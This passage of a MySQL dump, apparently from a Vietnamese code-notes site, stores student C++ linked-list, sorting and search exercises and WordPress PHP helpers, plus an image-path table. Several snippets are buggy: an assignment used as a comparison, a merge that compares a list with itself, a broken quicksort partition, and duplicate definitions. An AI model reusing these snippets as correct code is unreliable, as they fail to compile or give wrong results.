(30, 16, 'LinkedList_2.cpp', '//thêm, xóa node\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\nstruct Node{\r\n	int data;\r\n	Node* next;\r\n};\r\n\r\nvoid addToBeginning(Node*& head, int value){\r\n	Node* newNode = new Node;\r\n	newNode->data = value;\r\n	newNode->next = head;\r\n	head = newNode;\r\n}\r\n\r\nvoid deleteLastNode(Node*& head) {\r\n	if(head == nullptr) {\r\n		return; //danh sách rỗng\r\n	}\r\n	\r\n	if(head->next == nullptr){\r\n		delete head;\r\n		head = nullptr;\r\n		return; // danh sách chỉ có một node\r\n	}\r\n	\r\n	Node* current = head;\r\n	while(current->next->next != nullptr) {\r\n		current = current->next;\r\n	}\r\n	\r\n	delete current->next;\r\n	current->next = nullptr;\r\n}\r\n\r\nint main() {\r\n	Node* head = nullptr; //khởi tạo danh sách rỗng\r\n	\r\n	//thêm các node vào đầu danh sách\r\n	addToBeginning(head, 3);\r\n	addToBeginning(head, 2);\r\n	addToBeginning(head, 1);\r\n	\r\n	//xóa node cuối\r\n	deleteLastNode(head);\r\n	\r\n	//in danh sách\r\n	Node* current = head;\r\n	while(current != nullptr) {\r\n		cout << current->data << \" \";\r\n		current = current->next;\r\n	}\r\n	\r\n	return 0;\r\n}', '2024-07-18 03:51:43', '2024-07-18 03:51:43'),
(31, 16, 'LinkedList_3.cpp', '//đảo ngược thứ tự các node trong linked list\r\n//used 3 con trỏ\r\nstruct ListNode{\r\n	int val;\r\n	ListNode *next;\r\n	ListNode(int x) : val(x), next(NULL){}\r\n};\r\n\r\nListNode* reverseList(ListNode* head){\r\n	ListNode* prev = NULL;\r\n	ListNode* curr = head;\r\n	ListNode* next = NULL;\r\n	\r\n	while(curr != NULL) {\r\n		next = curr->next;\r\n		curr->next = prev;\r\n		prev = curr;\r\n		curr = next;\r\n	}\r\n	return prev;\r\n}\r\n\r\n//used đệ quy\r\nstruct ListNode{\r\n	int val;\r\n	ListNode *next;\r\n	ListNode(int x) : val(x), next(NULL){}\r\n};\r\n\r\nListNode* reverseList(ListNode* head){\r\n	if(head == NULL || head->next = NULL) {\r\n		return head;\r\n	}\r\n	ListNode* newHead = reverseList(head->next);\r\n	head->next->next = head;\r\n	head->next = NULL;\r\n	return newHead;\r\n}', '2024-07-18 03:59:50', '2024-07-18 03:59:50'),
(32, 16, 'LinkedList_4.cpp', '//tìm kiếm và xóa node chứa giá trị cụ thể trong linked list\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nstruct Node{\r\n	int data;\r\n	Node* next;\r\n}\r\n\r\nvoid deleteNode(Node** head, int value){\r\n	//trường hợp danh sách liên kết rỗng\r\n	if(*head == nullptr) {\r\n		return;\r\n	}\r\n	\r\n	//nếu node đầu danh sách liên kết chứa giá trị cần xóa\r\n	if((*head)->data == value) {\r\n		Node* temp = *head;\r\n		*head = (*head) -> next;\r\n		delete temp;\r\n		return;\r\n	}\r\n	\r\n	//tìm code chứa giá trị cần xóa\r\n	Node* current = *head;\r\n	Node* prev = nullptr;\r\n	\r\n	while(current != nullptr && current->data != value) {\r\n		prev = current;\r\n		current = current->next;\r\n	}\r\n	\r\n	//nếu không tồn tại giá trị cần xóa\r\n	if(current == nullptr) return;\r\n	\r\n	//xóa node chứa giá trị cần xóa\r\n	prev->next = current->next;\r\n	delete current;\r\n}\r\n\r\nvoid printList(Node* node) {\r\n	while(node != nullptr) {\r\n		cout << node->data << \" \";\r\n		node = node->next;\r\n	}\r\n	cout << endl;\r\n}\r\n\r\nint main() {\r\n	//tạo danh sách liên kết \r\n	Node* head = new Node();//Node đầu tiên\r\n	Node* second = new Node(); //node thứ hai\r\n	Node* third = new Node(); //node thứ ba\r\n	\r\n	//gán giá trị vào từng node\r\n	head->data = 1;\r\n	head->next = second;\r\n	second->data = 2;\r\n	second->next = third;\r\n	third->data = 3;\r\n	third->next = nullptr; //không có node kế tiếp\r\n	\r\n	//in ra danh sách liên kết ban đầu\r\n	cout << \"danh sách liên kết ban đầu: \";\r\n	printList(head);\r\n	\r\n	//tìm kiếm và xóa giá trị 2\r\n	deleteNode(&head, 2);\r\n	\r\n	//in ra danh sách sau khi xóa\r\n	cout << \"linked list sau khi delete là:\";\r\n	printList(head);\r\n	return 0;\r\n}', '2024-07-18 04:42:07', '2024-07-18 04:42:07'),
(33, 16, 'LinkedList_5.cpp', '//merge hai linked list\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nstruct Node{\r\n	int data;\r\n	Node* next;\r\n};\r\n\r\n//hàm để thêm một nút mới vào linked list\r\nvoid push(Node** head_ref, int new_data){\r\n	Node* new_node = new Node();\r\n	new_node->data = new_data;\r\n	new_node->next = (*head_ref);\r\n	(*head_ref) = new_node;\r\n}\r\n\r\n//hàm để in linked list\r\nvoid printList(Node* node) {\r\n	while(node != nullptr) {\r\n		cout << node->data << \" \";\r\n		node = node->next;\r\n	}\r\n	cout << endl;\r\n}\r\n\r\n//hàm để merge hai linked list đã cho thành một linked list\r\nNode* mergeLists(Node* list1, Node* list2) {\r\n	Node* result = nullptr;\r\n	\r\n	//nếu list1 là rỗng, trả về list2\r\n	if(list1 == nullptr) {\r\n		return list2;\r\n	}\r\n	\r\n	//nếu list2 là rỗng thì trả về list1\r\n	if(list2 == nullptr) {\r\n		return list1;\r\n	}\r\n	\r\n	//chọn node đầu tiên từ hai linked list\r\n	if(list1->data <= list1->data) {\r\n		result = list1;\r\n		result->next = mergeLists(list1->next, list2);\r\n	} else {\r\n		result = list2;\r\n		result->next = mergeLists(list1, list2->next);\r\n	}\r\n	\r\n	return result;\r\n}\r\n\r\nint main() {\r\n	//tạo hai linked list đã cho\r\n	Node* list1 = nullptr;\r\n	Node* list2 = nullptr;\r\n	\r\n	push(&list1, 5);\r\n	push(&list1, 3);\r\n	push(&list1, 1);\r\n	\r\n	push(&list2, 6);\r\n	push(&list2, 4);\r\n	push(&list2, 2);\r\n	\r\n	cout << \"linked list 1:\";\r\n	printList(list1);\r\n	\r\n	cout << \"linked list 2:\";\r\n	printList(list2);\r\n	\r\n	//merge 2 linked list\r\n	Node* mergedList = mergeLists(list1, list2);\r\n	\r\n	cout << \"merged list:\";\r\n	printList(mergedList);\r\n	\r\n	return 0;\r\n}', '2024-07-18 05:19:31', '2024-07-18 05:19:31'),
(34, 16, 'bubbleSort.cpp', 'void bubbleSort(int arr[], int n) {\r\n    int i, j;\r\n    for(i = 0; i < n-1; i++) {\r\n        for(j = 0; j < n-i-1; j++) {\r\n            if(arr[j] > arr[j + 1]) {\r\n                int temp = arr[j];\r\n                arr[j] = arr[j+1];\r\n                arr[j+1] = temp;\r\n            }\r\n        }\r\n    }\r\n}', '2024-08-19 08:43:36', '2024-08-19 08:43:36'),
(36, 16, 'insertionSort.cpp', 'void insertionSort(int arr[], int n) {\r\n    int i, key, j;\r\n    for(i = 1; i < n; i++) {\r\n        key = arr[i];\r\n        j = i - 1;\r\n        while(j >= 0 && arr[j] > key) {\r\n            arr[j + 1] = arr[j];\r\n            j = j - 1;\r\n        }\r\n        arr[j + 1] = key;\r\n    }\r\n}', '2024-08-19 08:47:33', '2024-08-19 08:47:33'),
(37, 16, 'selectionSort.cpp', 'void selectionSort(int arr[], int n) {\r\n    int i, j, minIndex, temp;\r\n    for(i = 0; i < n - 1; i++) {\r\n        minIndex = i;\r\n        for(j = i + 1; j < n; j++) {\r\n            if(arr[j] < arr[minIndex]) {\r\n                minIndex = j;\r\n            }\r\n        }\r\n        temp = arr[minIndex];\r\n        arr[minIndex] = arr[i];\r\n        arr[i] = temp;\r\n    }\r\n}', '2024-08-19 08:50:41', '2024-08-19 08:50:41'),
(38, 16, 'quickSort.cpp', 'void quickSort(int arr[], int low, int high) {\r\n    if(low < high) {\r\n        int pivot = partition(arr, low, high);\r\n        quickSort(arr, low, pivot - 1);\r\n        quickSort(arr, pivot + 1, high);\r\n    }\r\n}\r\nint partition(int arr[], int low, int high) {\r\n    int pivot = arr[high];\r\n    int i = low = 1;\r\n    for(int j = low; j <= high-1; j++) {\r\n        if(arr[j] < pivot) {\r\n            i++;\r\n            swap(&arr[i], &arr[j]);\r\n        }\r\n    }\r\n    swap(&arr[i + 1], &arr[high]);\r\n    return (i + 1);\r\n}\r\nvoid swap(int* a, int* b) {\r\n    int temp = *a;\r\n    *a = *b;\r\n    *b = temp;\r\n}', '2024-08-19 08:54:58', '2024-08-19 08:54:58'),
(39, 16, 'mergeSort1.cpp', 'void merge(int arr[], int left, int mid, int right) {\r\n    int i, j, k;\r\n    int n1 = mid - left + 1;\r\n    int n2 = right - mid;\r\n    int L[n1], R[n2];\r\n\r\n    for(i = 0; i < n1; i++) {\r\n        L[i] = arr[left + i];\r\n    }\r\n    for(j = 0; j < n2; j++) {\r\n        R[j] = arr[mid + 1 + j];\r\n    }\r\n    i = 0;\r\n    j = 0;\r\n    k = left;\r\n    while(i < n1 && j < n2) {\r\n        if(L[i] <= R[j]) {\r\n            arr[k] = L[i];\r\n            i++;\r\n        } else {\r\n            arr[k] = R[j];\r\n            j++;\r\n        }\r\n        k++;\r\n    }\r\n}', '2024-08-19 09:00:39', '2024-08-19 09:00:39'),
(40, 16, 'mergeSort2.cpp', 'while(i < n1) {\r\n    arr[k] = L[i];\r\n    i++;\r\n    k++;\r\n}\r\nwhile(j < n2) {\r\n    arr[k] = R[j];\r\n    j++;\r\n    k++;\r\n}\r\nvoid mergeSort(int arr[], int left, int right) {\r\n    if(left < right) {\r\n        int mid = left + (right - left) / 2;\r\n        mergeSort(arr, left, mid);\r\n        mergeSort(arr, mid + 1, right);\r\n        merge(arr, left, mid, right);\r\n    }\r\n}', '2024-08-19 09:03:18', '2024-08-19 09:03:18'),
(41, 16, 'LinearSearch.cpp', 'int linearSearch(int a[], int n, int k) {\r\n    int position = -1;\r\n    for(int i = 0; i < n; i++) {\r\n        if(a[i] == k) {\r\n            position = i;\r\n            break;\r\n        }\r\n    }\r\n    return position;\r\n}', '2024-08-19 09:05:09', '2024-08-19 09:05:09'),
(42, 16, 'sentinelLinearSearch.cpp', 'int sentinelLinearSearch(int a[], int n, int k) {\r\n    if(a[n-1] == k){\r\n        return n - 1;\r\n    }\r\n    int temp = a[n-1];\r\n    a[n-1] = k;\r\n    int i = 0;\r\n    for(; a[i] != k; i++);\r\n    a[n-1] = temp;\r\n    if(i < n-1) {\r\n        return i;\r\n    }\r\n    return -1;\r\n}', '2024-08-19 09:08:15', '2024-08-19 09:08:15');
INSERT INTO `files` (`id`, `project_id`, `name`, `content`, `created_at`, `updated_at`) VALUES
(43, 17, 'tin.php', '//code tinh luot xem cho bai viet \r\nfunction setpostview($postID) {\r\n    $count_key = \'views\';\r\n    $count = get_post_meta($postID, $count_key, true);\r\n    if($count == \'\') {\r\n        $count = 0;\r\n        delete_post_meta($postID, $count_key);\r\n        add_post_meta($postID, $count_key, \'0\');\r\n    } else {\r\n        $count++;\r\n        update_post_meta($postID, $count_key, $count);\r\n    }\r\n}\r\nfunction getpostviews($postID) {\r\n    $count_key = \'views\';\r\n    $count = get_post_meta($postID, $count_key, true);\r\n    if($count == \'\') {\r\n        delete_post_meta($postID, $count_key);\r\n        add_post_meta($postID, $count_key, \'0\');\r\n        return \"0\";\r\n    }\r\n    return $count;\r\n}', '2024-08-19 09:15:02', '2024-08-19 09:15:02'),
(44, 17, 'teaser.php', '//code lay noi dung bai viet rut gon\r\nfunction teaser($limit) {\r\n    $excerpt = explode(\' \', get_the_excerpt(), $limit);\r\n    if(count($excerpt) >= $limit) {\r\n        array_pop($excerpt);\r\n        $excerpt = implode(\" \", $excerpt).\'[...]\';\r\n    } else {\r\n        $excerpt = implode(\" \", $excerpt);\r\n    }\r\n    $excerpt = preg_replace(\'`[[^]]*]`\', \'\', $excerpt);\r\n    return $excerpt.\'...\';\r\n}', '2024-08-19 09:24:03', '2024-08-19 09:24:03');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `images`
--

CREATE TABLE `images` (
  `id` int NOT NULL,
  `image` text NOT NULL,
  `author` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `time_upload` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;

--
-- Đang đổ dữ liệu cho bảng `images`
--

INSERT INTO `images` (`id`, `image`, `author`, `time_upload`) VALUES
(13, 'photo/370476969_1447226572510652_4024782213247139857_n.jpg', 'sưu tầm', '2024-06-29 06:07:41'),
(14, 'photo/371928963_1447226562510653_1458618629040059383_n.jpg', 'sưu tầm', '2024-06-29 06:08:08'),
(15, 'photo/372645581_1447226982510611_1162140397308229758_n.jpg', 'sưu tầm', '2024-06-29 06:17:10'),
(16, 'photo/372828739_1447226599177316_3727958516890501084_n.jpg', 'sưu tầm', '2024-06-29 06:17:44'),
(17, 'photo/398004965_3681798572050592_5107885273934685288_n.jpg', 'sưu tầm', '2024-06-29 06:35:55'),
(18, 'photo/398215925_900336561430236_2917227951006935515_n.jpg', 'sưu tầm', '2024-06-29 06:36:09'),
(19, 'photo/398539409_915220839963815_6094946989947131665_n.jpg', 'sưu tầm', '2024-06-29 06:36:16'),
(20, 'photo/397994609_207335895643783_4329554982936948571_n.jpg', 'sưu tầm', '2024-06-29 06:37:19'),
(21, 'photo/398010618_709138431091151_8060669073406853496_n.jpg', 'sưu tầm', '2024-06-29 06:37:31'),
(22, 'photo/398414693_872623670721219_4251603738194613651_n.jpg', 'sưu tầm', '2024-06-29 06:37:46'),
(23, 'photo/398424854_1065021064669229_2744925803057873957_n.jpg', 'sưu tầm', '2024-06-29 06:38:05'),
(24, 'photo/398453775_732559505382592_7623553347702993512_n.jpg', 'sưu tầm', '2024-06-29 06:38:18'),
(25, 'photo/398464193_1466127183954752_5671301599801173353_n.jpg', 'sưu tầm', '2024-06-29 06:38:30'),
(26, 'photo/398471150_661495499433331_6378870235804079310_n.jpg', 'sưu tầm', '2024-06-29 06:38:43'),
(27, 'photo/398519755_6672117126229645_6113522875374398592_n.jpg', 'sưu tầm', '2024-06-29 06:38:52'),
(28, 'photo/399129061_691756206276390_6279433985882677928_n.jpg', '', '2024-06-29 06:38:59'),
(29, 'photo/399157194_867755698316373_2773067296301981849_n.jpg', 'sưu tầm', '2024-06-29 06:39:12'),
(30, 'photo/398393072_650703477210680_1166375644774528597_n.jpg', 'sưu tầm', '2024-06-29 06:41:08'),
(31, 'photo/398460866_832580851986712_389179356501282516_n.jpg', 'sưu tầm', '2024-06-29 06:41:16'),
(32, 'photo/399655061_352718207131162_1200381151703423222_n.jpg', 'sưu tầm', '2024-06-29 06:41:23'),
(33, 'photo/397994601_1093111198341864_662593636350128599_n.jpg', 'sưu tầm', '2024-06-29 06:42:34'),
(34, 'photo/397997164_1065707864852111_6148462004630513374_n.jpg', 'sưu tầm', '2024-06-29 06:42:49'),
(35, 'photo/398004961_205226069193799_3885793005686699486_n.jpg', 'sưu tầm', '2024-06-29 06:43:04'),
(36, 'photo/398004961_847758793801729_832412959594614459_n.jpg', 'sưu tầm', '2024-06-29 06:43:20'),
(37, 'photo/398013695_718928590267175_7303207003806771105_n.jpg', 'sưu tầm', '2024-06-29 06:43:42'),
(38, 'photo/398028041_1783378785414974_3004572425516399911_n.jpg', 'sưu tầm', '2024-06-29 06:43:54'),
(39, 'photo/398384679_632829385453462_6202034670789824048_n.jpg', 'sưu tầm', '2024-06-29 06:44:08'),
(40, 'photo/398393072_1015782113045695_7225511845302366344_n.jpg', 'sưu tầm', '2024-06-29 06:44:25'),
(41, 'photo/398414682_241159482303746_8433693160589493162_n.jpg', 'sưu tầm', '2024-06-29 06:44:39'),
(42, 'photo/398424854_343525561555796_2027552702967640999_n.jpg', 'sưu tầm', '2024-06-29 06:44:53'),
(43, 'photo/398450016_1005722220686119_280710727349156487_n.jpg', 'sưu tầm', '2024-06-29 06:45:05'),
(44, 'photo/398519739_1496007237899807_3193232923418364439_n.jpg', 'sưu tầm', '2024-06-29 06:45:31'),
(45, 'photo/398519741_350310684156966_1295049979140467123_n.jpg', 'sưu tầm', '2024-06-29 06:45:43'),
(46, 'photo/398531784_654872906630844_5259555808890253405_n.jpg', 'sưu tầm', '2024-06-29 06:45:53'),
(47, 'photo/399112002_1598540580676303_2293697588838098231_n.jpg', 'sưu tầm', '2024-06-29 06:46:07'),
(48, 'photo/399124877_850187863215345_1135434157765182019_n.jpg', 'sưu tầm', '2024-06-29 06:46:22'),
(49, 'photo/399143139_185950417897873_2007466587753413787_n.jpg', 'sưu tầm', '2024-06-29 06:46:35'),
(50, 'photo/399161712_1027964518453358_4917596094357691426_n.jpg', 'sưu tầm', '2024-06-29 06:46:47'),
(51, 'photo/399665970_878121183929374_7902933923028539382_n.jpg', 'sưu tầm', '2024-06-29 06:46:58'),
(52, 'photo/399713944_686032693500055_3947796414583720528_n.jpg', 'sưu tầm', '2024-06-29 06:47:10'),
(53, 'photo/399825632_864752575054895_488457198639873919_n.jpg', 'sưu tầm', '2024-06-29 06:47:24'),
(54, 'photo/363495504_6928662030488386_2928471778986040094_n.jpg', 'sưu tầm', '2024-06-29 07:37:16'),
(55, 'photo/363504701_250957507599444_2608187126987202472_n.jpg', 'sưu tầm', '2024-06-29 07:37:29'),
(56, 'photo/363575130_1543915526383678_2206704243528165072_n.jpg', 'sưu tầm', '2024-06-29 07:37:42'),
(57, 'photo/363627789_856831649354322_4002391400986737756_n.jpg', 'sưu tầm', '2024-06-29 07:37:56'),
(58, 'photo/367830882_709157667381975_2070519030040715733_n.jpg', 'sưu tầm', '2024-06-29 07:38:09'),
(59, 'photo/367957655_1831053690669900_2708978912447899437_n.jpg', 'sưu tầm', '2024-06-29 07:38:24'),
(60, 'photo/368108548_1289174008430704_6013291581975577687_n.jpg', 'sưu tầm', '2024-06-29 07:39:32'),
(61, 'photo/370298209_863134438474189_5782700268033099377_n.jpg', 'sưu tầm', '2024-06-29 07:39:45'),
(62, 'photo/370327191_883211286549964_7131432158620682045_n.jpg', 'sưu tầm', '2024-06-29 07:39:56'),
(63, 'photo/371470395_861680055661308_599217302197391701_n.jpg', 'sưu tầm', '2024-06-29 07:40:11'),
(64, 'photo/371476715_726800899493505_6382636295110987668_n.jpg', 'sưu tầm', '2024-06-29 07:40:24'),
(65, 'photo/371517318_190018064145735_6509572518012369270_n.jpg', 'sưu tầm', '2024-06-29 07:40:38'),
(66, 'photo/371530793_709216074432145_1185201892633805435_n.jpg', 'sưu tầm', '2024-06-29 07:40:50'),
(67, 'photo/399755339_730693472431750_449528279986335092_n.jpg', 'sưu tầm', '2024-06-29 07:41:10'),
(68, 'photo/399768164_888561842944257_7842539882742058321_n.jpg', 'sưu tầm', '2024-06-29 07:41:23'),
(69, 'photo/399861567_892143901911262_7097301520386670741_n.jpg', 'sưu tầm', '2024-06-29 07:41:37'),
(70, 'photo/400048059_3562209877350638_5647599234514512912_n.jpg', 'sưu tầm', '2024-06-29 07:41:49'),
(71, 'photo/400690135_10223818305997717_5932881634970873019_n.jpg', 'sưu tầm', '2024-06-29 07:42:00'),
(72, 'photo/363731046_6843298305717172_5701053865252883085_n.jpg', 'sưu tầm', '2024-06-29 07:44:37'),
(73, 'photo/367358331_1007207497204535_7226671635024906988_n.jpg', 'sưu tầm', '2024-06-29 07:44:53'),
(74, 'photo/367358331_1677004582822256_8978169406667099129_n.jpg', 'sưu tầm', '2024-06-29 07:45:06'),
(75, 'photo/367368199_269149232786801_8600987146421860254_n.jpg', 'sưu tầm', '2024-06-29 07:46:32'),
(76, 'photo/367516227_1715037812350769_1629312572643651017_n.jpg', 'sưu tầm', '2024-06-29 07:46:44'),
(77, 'photo/367970836_1970729769967532_2804480849349166945_n.jpg', 'sưu tầm', '2024-06-29 07:46:58'),
(78, 'photo/367985545_632486065751711_8998077923601872777_n.jpg', 'sưu tầm', '2024-06-29 07:47:11'),
(79, 'photo/368016445_881098203415037_2906282065321154307_n.jpg', 'sưu tầm', '2024-06-29 07:47:25'),
(80, 'photo/368073207_6915603798497697_6386023680521072363_n.jpg', 'sưu tầm', '2024-06-29 07:47:42'),
(81, 'photo/368108548_637158778631769_7465456965081494719_n.jpg', 'sưu tầm', '2024-06-29 07:47:56'),
(82, 'photo/368441979_720051366249353_4558433953214026160_n.jpg', 'sưu tầm', '2024-06-29 07:48:16'),
(83, 'photo/368561116_813043300827173_3357428453316069102_n.jpg', 'sưu tầm', '2024-06-29 07:48:29'),
(84, 'photo/369486971_262589179640802_960251551644471740_n.jpg', 'sưu tầm', '2024-06-29 07:48:41'),
(85, 'photo/370216391_6326529354119307_5785769080268851481_n.jpg', 'sưu tầm', '2024-06-29 07:48:53'),
(86, 'photo/371503303_2044134702633697_8811437012181369452_n.jpg', 'sưu tầm', '2024-06-29 07:49:05'),
(87, 'photo/371507216_2276846325846333_8634449086949211405_n.jpg', 'sưu tầm', '2024-06-29 07:49:19'),
(88, 'photo/371509026_1484448645723252_7111634063221240896_n.jpg', 'sưu tầm', '2024-06-29 07:49:32'),
(89, 'photo/371510704_337358555495207_1602348205709833603_n.jpg', 'sưu tầm', '2024-06-29 07:49:45'),
(90, 'photo/371514836_844325517489360_3756633545301091986_n.jpg', 'sưu tầm', '2024-06-29 07:50:06'),
(91, 'photo/371547475_667431498702100_6349290307335300589_n.jpg', 'sưu tầm', '2024-06-29 07:50:17'),
(92, 'photo/387501461_2655411487949963_7072979041387088588_n.jpg', 'sưu tầm', '2024-06-29 07:50:28'),
(93, 'photo/387511280_296110666534605_590708315188834165_n.jpg', 'sưu tầm', '2024-06-29 07:50:40'),
(94, 'photo/387519493_1035636141082941_7992081652690309432_n.jpg', 'sưu tầm', '2024-06-29 07:50:50'),
(95, 'photo/387638062_1467160160806591_5820223224385713462_n.jpg', 'sưu tầm', '2024-06-29 07:51:05'),
(96, 'photo/387641449_1065741001121202_3978410809626629519_n.jpg', 'sưu tầm', '2024-06-29 07:51:15'),
(97, 'photo/387641580_702847051771561_6160547409814578480_n.jpg', 'sưu tầm', '2024-06-29 07:51:27'),
(98, 'photo/387642185_147871475049851_3979064545725732033_n.jpg', 'sưu tầm', '2024-06-29 07:51:37'),
(99, 'photo/371540317_342308621547423_5844724121798875364_n.jpg', 'sưu tầm', '2024-06-29 08:57:31'),
(100, 'photo/380088969_255179477063406_5223142295049634248_n.jpg', 'sưu tầm', '2024-06-29 08:58:02'),
(101, 'photo/380768994_132409086629792_7207142490363814700_n.jpg', 'sưu tầm', '2024-06-29 08:58:27'),
(102, 'photo/384568598_872755460645752_4143834670136597995_n.jpg', 'sưu tầm', '2024-06-29 08:58:56'),
(103, 'photo/385510463_225818047174575_7529099787949380528_n.jpg', 'sưu tầm', '2024-06-29 08:59:12'),
(104, 'photo/387494446_768529798411012_9016500056073896027_n.jpg', 'sưu tầm', '2024-06-29 08:59:26'),
(105, 'photo/387507180_213735524935689_7954464989910074135_n.jpg', 'sưu tầm', '2024-06-29 08:59:43'),
(106, 'photo/387532441_859555005843090_3072774470033273039_n.jpg', 'sưu tầm', '2024-06-29 08:59:58'),
(107, 'photo/387550708_354397713681329_1623894322808044853_n.jpg', 'sưu tầm', '2024-06-29 09:00:17'),
(108, 'photo/387588523_2094772717544153_2974100293874824038_n.jpg', 'sưu tầm', '2024-06-29 09:00:38'),
(109, 'photo/387604150_6919773964786433_8718850343634123990_n.jpg', 'sưu tầm', '2024-06-29 09:01:19'),
(110, 'photo/387604153_964954624606624_5234936040649432878_n.jpg', 'sưu tầm', '2024-06-29 09:01:34'),
(111, 'photo/387611833_724742655817047_2309025245551937840_n.jpg', 'sưu tầm', '2024-06-29 09:01:48'),
(112, 'photo/387616092_3797502303869370_1762894513061535517_n.jpg', 'sưu tầm', '2024-06-29 09:02:04'),
(113, 'photo/387632822_709161807801888_1868413722657398980_n.jpg', 'sưu tầm', '2024-06-29 09:02:22'),
(114, 'photo/387638080_308499801967999_3892620085353597527_n.jpg', 'sưu tầm', '2024-06-29 09:02:36'),
(115, 'photo/387641341_317962847600515_2206581230923321437_n.jpg', 'sưu tầm', '2024-06-29 09:02:50'),
(116, 'photo/387641368_1012392446760265_5886107189036454330_n.jpg', 'sưu tầm', '2024-06-29 09:03:04'),
(117, 'photo/387641433_1561256267742278_3028126231486328985_n.jpg', 'sưu tầm', '2024-06-29 09:04:47'),
(118, 'photo/387641446_347818164449547_2700772467624579260_n.jpg', 'sưu tầm', '2024-06-29 09:05:05'),
(119, 'photo/387645455_325265160132351_8952387242596173102_n.jpg', 'sưu tầm', '2024-06-29 09:05:32'),
(120, 'photo/387645455_2436680226492590_3507044484819506088_n.jpg', 'sưu tầm', '2024-06-29 09:05:47'),
(121, 'photo/387652284_1037066290660802_318634875122311825_n.jpg', 'sưu tầm', '2024-06-29 09:06:05'),
(122, 'photo/393173611_317784177615602_5795901298708998634_n.jpg', 'sưu tầm', '2024-06-29 09:06:20'),
(123, 'photo/393232175_1142761840466332_4329192041113184619_n.jpg', 'sưu tầm', '2024-06-29 09:06:33'),
(124, 'photo/393281034_708892124454925_7188945991465168787_n.jpg', 'sưu tầm', '2024-06-29 09:06:50'),
(125, 'photo/393305881_700046678452576_31200033448256178_n.jpg', 'sưu tầm', '2024-06-29 09:07:21'),
(126, 'photo/393324710_239332439126000_5514262272000931129_n.jpg', 'sưu tầm', '2024-06-29 09:07:34'),
(127, 'photo/393370751_2424883854365438_6095942613994741094_n.jpg', 'sưu tầm', '2024-06-29 09:08:19'),
(128, 'photo/393422078_865394991464122_1338193731299777425_n.jpg', 'sưu tầm', '2024-06-29 09:08:33'),
(129, 'photo/393454390_2525847617593409_4452244243690635187_n.jpg', 'sưu tầm', '2024-06-29 09:08:45'),
(130, 'photo/393462561_1351461832430561_1491670294896640512_n.jpg', 'sưu tầm', '2024-06-29 09:08:59'),
(131, 'photo/393736301_1391632945113098_6562712667810378519_n.jpg', 'sưu tầm', '2024-06-29 09:09:14'),
(132, 'photo/393736301_3000225626775052_1271197152591235112_n.jpg', 'sưu tầm', '2024-06-29 09:09:28'),
(133, 'photo/393736315_3633520213594126_5138867094186056378_n.jpg', 'sưu tầm', '2024-06-29 09:09:39'),
(134, 'photo/393761335_1057818825219689_2852391619507550223_n.jpg', 'sưu tầm', '2024-06-29 09:09:54'),
(135, 'photo/393786570_671803861707457_2735110290548522137_n.jpg', 'sưu tầm', '2024-06-29 09:10:11'),
(136, 'photo/393790320_707582697487667_6685531965691646618_n.jpg', 'sưu tầm', '2024-06-29 09:10:25'),
(137, 'photo/393802016_1374973476706201_2530219125986572691_n.jpg', 'sưu tầm', '2024-06-29 09:10:39'),
(138, 'photo/393810982_311910291557113_622331660026402311_n.jpg', 'sưu tầm', '2024-06-29 09:10:50'),
(139, 'photo/393813507_1468853147018607_7142815012020342011_n.jpg', 'sưu tầm', '2024-06-29 09:11:05'),
(140, 'photo/393825274_655055836697265_4857928848845085363_n.jpg', 'sưu tầm', '2024-06-29 09:14:14'),
(141, 'photo/393836713_264610076569167_5501354698510106682_n.jpg', 'sưu tầm', '2024-06-29 09:14:29'),
(142, 'photo/393836774_983568219603400_7740936626145531283_n.jpg', 'sưu tầm', '2024-06-29 09:14:42'),
(143, 'photo/393838731_349651014094967_6111568198619529838_n.jpg', 'sưu tầm', '2024-06-29 09:14:56'),
(144, 'photo/393838744_299925389500001_8464666312594773032_n.jpg', 'sưu tầm', '2024-06-29 09:15:13'),
(145, 'photo/393846395_1036056367663489_4118298779888772708_n.jpg', 'sưu tầm', '2024-06-29 09:15:25'),
(146, 'photo/393864881_1088018885886376_7669535790414152591_n.jpg', 'sưu tầm', '2024-06-29 09:15:40'),
(147, 'photo/393875271_1975221012850822_5561021236500998442_n.jpg', 'sưu tầm', '2024-06-29 09:15:54'),
(148, 'photo/393877293_976990640037343_5356825142405553036_n.jpg', 'sưu tầm', '2024-06-29 09:16:13'),
(149, 'photo/393900191_1429118724316793_987866036458079801_n.jpg', 'sưu tầm', '2024-06-29 09:22:52'),
(150, 'photo/393902991_358100896557710_5958498738141564413_n.jpg', 'sưu tầm', '2024-06-29 09:23:04'),
(151, 'photo/393910030_364707815911071_1941815848501039130_n.jpg', 'sưu tầm', '2024-06-29 09:23:17'),
(152, 'photo/393945688_1042753320096633_7391035054130634990_n.jpg', 'sưu tầm', '2024-06-29 09:23:29'),
(153, 'photo/393950590_668389328727517_3313118872247956330_n.jpg', 'sưu tầm', '2024-06-29 09:23:39'),
(154, 'photo/393953728_801264941687842_5950093277435498487_n.jpg', 'sưu tầm', '2024-06-29 09:23:54'),
(155, 'photo/393955103_672922374943528_1468936044711838841_n.jpg', 'sưu tầm', '2024-06-29 09:24:05'),
(156, 'photo/393958884_3495135637387959_9220213651140977071_n.jpg', 'sưu tầm', '2024-06-29 09:24:47'),
(157, 'photo/393973978_1067024288082647_7982394114880507723_n.jpg', 'sưu tầm', '2024-06-29 09:25:04'),
(158, 'photo/393975206_648651280718921_7884530679071527886_n.jpg', 'sưu tầm', '2024-06-29 09:25:39'),
(159, 'photo/394001008_869489697919153_8028429351804395079_n.jpg', 'sưu tầm', '2024-06-29 09:26:21'),
(160, 'photo/394003252_699786191694753_4639697385365117939_n.jpg', 'sưu tầm', '2024-06-29 09:26:35'),
(161, 'photo/394007943_866813154844401_5025086230485992380_n.jpg', 'sưu tầm', '2024-06-29 09:26:48'),
(162, 'photo/394013125_314269984639971_7907813144151763664_n.jpg', 'sưu tầm', '2024-06-29 09:29:17'),
(163, 'photo/394013132_938456754424980_143695042517462074_n.jpg', 'sưu tầm', '2024-06-29 09:29:39'),
(164, 'photo/394016018_1117295562571782_6007804744969194416_n.jpg', 'sưu tầm', '2024-06-29 09:29:54'),
